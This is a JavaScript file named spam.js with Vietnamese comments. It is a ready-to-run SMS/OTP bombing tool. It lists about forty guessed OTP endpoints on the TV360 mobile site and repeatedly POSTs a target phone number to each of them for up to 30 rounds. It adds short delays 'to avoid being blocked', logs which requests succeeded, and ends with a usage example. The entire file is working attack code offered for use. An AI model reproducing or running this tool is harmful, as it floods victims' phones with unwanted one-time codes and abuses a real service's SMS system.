// ===== API TỰ ĐỘNG TÌM =====
// Lưu ý: Đây là file spam.js đã được cập nhật với các API từ tv360

// ===== DANH SÁCH API TV360 (TỰ ĐỘNG QUÉT) =====
const tv360Apis = [
    { name: 'TV360_OTP', url: 'https://m.tv360.vn/api/otp' },
    { name: 'TV360_SEND_OTP', url: 'https://m.tv360.vn/api/send-otp' },
    { name: 'TV360_SENDOTP', url: 'https://m.tv360.vn/api/sendotp' },
    { name: 'TV360_GET_OTP', url: 'https://m.tv360.vn/api/get-otp' },
    { name: 'TV360_GETOTP', url: 'https://m.tv360.vn/api/getotp' },
    { name: 'TV360_REQUEST_OTP', url: 'https://m.tv360.vn/api/request-otp' },
    { name: 'TV360_VERIFY_OTP', url: 'https://m.tv360.vn/api/verify-otp' },
    { name: 'TV360_LOGIN_OTP', url: 'https://m.tv360.vn/api/login/otp' },
    { name: 'TV360_REGISTER_OTP', url: 'https://m.tv360.vn/api/register/otp' },
    { name: 'TV360_AUTH_OTP', url: 'https://m.tv360.vn/api/auth/otp' },
    { name: 'TV360_V1_OTP', url: 'https://m.tv360.vn/api/v1/otp' },
    { name: 'TV360_V2_OTP', url: 'https://m.tv360.vn/api/v2/otp' },
    { name: 'TV360_V3_OTP', url: 'https://m.tv360.vn/api/v3/otp' },
    { name: 'TV360_USER_OTP', url: 'https://m.tv360.vn/api/user/otp' },
    { name: 'TV360_PHONE_OTP', url: 'https://m.tv360.vn/api/phone/otp' },
    { name: 'TV360_MOBILE_OTP', url: 'https://m.tv360.vn/api/mobile/otp' },
    { name: 'TV360_SMS_SEND', url: 'https://m.tv360.vn/api/sms/send' },
    { name: 'TV360_OTP_SEND', url: 'https://m.tv360.vn/api/otp/send' },
    { name: 'TV360_OTP_REQUEST', url: 'https://m.tv360.vn/api/otp/request' },
    { name: 'TV360_OTP_GENERATE', url: 'https://m.tv360.vn/api/otp/generate' },
    { name: 'TV360_OTP_CREATE', url: 'https://m.tv360.vn/api/otp/create' },
    { name: 'TV360_OTP_LOGIN', url: 'https://m.tv360.vn/api/otp/login' },
    { name: 'TV360_OTP_REGISTER', url: 'https://m.tv360.vn/api/otp/register' },
    { name: 'TV360_AUTH_OTP2', url: 'https://m.tv360.vn/auth/otp' },
    { name: 'TV360_AUTH_SEND_OTP', url: 'https://m.tv360.vn/auth/send-otp' },
    { name: 'TV360_AUTH_GET_OTP', url: 'https://m.tv360.vn/auth/get-otp' },
    { name: 'TV360_USER_OTP2', url: 'https://m.tv360.vn/user/otp' },
    { name: 'TV360_USER_SEND_OTP', url: 'https://m.tv360.vn/user/send-otp' },
    { name: 'TV360_USER_GET_OTP', url: 'https://m.tv360.vn/user/get-otp' },
    { name: 'TV360_PHONE_OTP2', url: 'https://m.tv360.vn/phone/otp' },
    { name: 'TV360_PHONE_SEND_OTP', url: 'https://m.tv360.vn/phone/send-otp' },
    { name: 'TV360_MOBILE_OTP2', url: 'https://m.tv360.vn/mobile/otp' },
    { name: 'TV360_MOBILE_SEND_OTP', url: 'https://m.tv360.vn/mobile/send-otp' },
    { name: 'TV360_SEND_OTP2', url: 'https://m.tv360.vn/send-otp' },
    { name: 'TV360_GET_OTP2', url: 'https://m.tv360.vn/get-otp' },
    { name: 'TV360_REQUEST_OTP2', url: 'https://m.tv360.vn/request-otp' },
    { name: 'TV360_VERIFY_OTP2', url: 'https://m.tv360.vn/verify-otp' },
    { name: 'TV360_OTP_SEND2', url: 'https://m.tv360.vn/otp/send' },
    { name: 'TV360_OTP_GET', url: 'https://m.tv360.vn/otp/get' },
    { name: 'TV360_OTP_REQUEST2', url: 'https://m.tv360.vn/otp/request' },
    { name: 'TV360_OTP_VERIFY', url: 'https://m.tv360.vn/otp/verify' },
];

// ===== TẠO HÀM SPAM TỪ DANH SÁCH API =====
const spamFunctions = tv360Apis.map(api => {
    return (phone) => fetch(api.url, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: JSON.stringify({ phone: phone, msisdn: phone, mobile: phone, phonenumber: phone })
    }).then(r => r.text()).then(t => {
        // Kiểm tra nhiều dạng phản hồi thành công
        return (t.includes('success') || 
                t.includes('otp') || 
                t.includes('OK') || 
                t.includes('200') || 
                t.includes('"code":0') || 
                t.includes('"status":0') || 
                t.includes('otpTrackingId') ||
                t.includes('"success":true')) ? 'OK' : 'FAIL';
    }).catch(() => 'FAIL');
});

// ===== DANH SÁCH TÊN SERVICE =====
const serviceNames = tv360Apis.map(api => api.name);

// ===== HÀM SPAM CHÍNH =====
let running = false;
let stopRequested = false;

function addLog(msg, type = 'info') {
    // Hàm này sẽ được gán từ bên ngoài (từ index.html)
    if (typeof window.addLog === 'function') {
        window.addLog(msg, type);
    } else {
        console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
    }
}

async function runSpam(phone, count) {
    if (running) {
        addLog('⚠️ Đang chạy, vui lòng đợi hoặc nhấn Dừng', 'fail');
        return;
    }
    if (!phone || phone.length < 9) {
        addLog('❌ Số điện thoại không hợp lệ', 'fail');
        return;
    }
    let total = parseInt(count) || 1;
    if (total < 1) total = 1;
    if (total > 30) total = 30;

    running = true;
    stopRequested = false;
    addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (TV360 - ${spamFunctions.length} API)`, 'info');

    for (let i = 0; i < total; i++) {
        if (stopRequested) break;
        addLog(`--- Lượt ${i+1}/${total} ---`, 'info');

        for (let j = 0; j < spamFunctions.length; j++) {
            if (stopRequested) break;
            try {
                const result = await spamFunctions[j](phone);
                const name = serviceNames[j] || 'TV360_API';
                if (result === 'OK') {
                    addLog(`✅ ${name} -> Thành công`, 'success');
                } else {
                    addLog(`❌ ${name} -> Thất bại`, 'fail');
                }
            } catch (e) {
                const name = serviceNames[j] || 'TV360_API';
                addLog(`⚠️ ${name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
            }
            // Delay nhẹ để tránh bị chặn
            await new Promise(r => setTimeout(r, 50));
        }

        if (i < total - 1 && !stopRequested) {
            addLog(`⏳ Chờ 1 giây...`, 'info');
            await new Promise(r => setTimeout(r, 1000));
        }
    }

    running = false;
    if (stopRequested) {
        addLog('⏹️ Đã dừng theo yêu cầu', 'fail');
    } else {
        addLog(`🏁 Hoàn thành! Đã gửi ${spamFunctions.length * total} request`, 'success');
    }
}

// ===== XUẤT RA TOÀN CỤC =====
window.runSpam = runSpam;
window.tv360Apis = tv360Apis;
window.spamFunctions = spamFunctions;
window.serviceNames = serviceNames;

console.log(`✅ Đã tải ${spamFunctions.length} API TV360`);
console.log('📌 Gọi runSpam("0987654321", 3) để chạy');
